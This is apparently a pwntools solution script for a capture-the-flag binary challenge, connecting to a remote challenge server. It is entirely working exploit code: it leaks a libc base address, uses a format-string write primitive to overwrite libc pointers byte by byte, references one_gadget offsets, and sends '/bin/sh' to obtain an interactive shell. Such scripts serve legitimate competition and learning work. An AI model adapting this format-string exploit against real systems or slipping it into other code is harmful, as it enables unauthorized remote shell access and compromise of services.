from pwn import *

if args.LOCAL:
    io=process('./chall')
    if args.GDB:
        cmd="""
        init-pwndbg
        b* vuln+132
        """
        gdb.attach(io, cmd)
    libc=ELF('./libc.so.6')
else:
    io=remote('34.70.212.151', 8002)
    libc=ELF('./libc.so.6')

io.sendline(b'1')    


def write(byte, add):
    io.sendline(b'2')
    pl = '%{}c%8$hhn'.format(byte).ljust(16,'\0').encode()
    pl+=add
    io.sendline(pl)

io.recvuntil(b'Have this: ')
og=[0x54ed3, 0x11060a, 0x110612, 0x110617]
libc.address=int(io.recv(14), 16) - 0x81600
print(hex(libc.address))

target0=libc.address+0x1fe188
target= libc.address+0x1fe080
target1= libc.address+0x1fe170
#p64(libc.sym.system)
one=p64(libc.sym.strlen)
rbp=p64(0xaeb73+libc.address)
pause()
for i in range(6):
    write(u8(one[i:i+1]), p64(target1+i))

# for i in range(6):
#     write(u8(rbp[i:i+1]), p64(target0+i))
io.sendline(b'3')
pause()
io.sendline(b'/bin/sh\0')
io.interactive()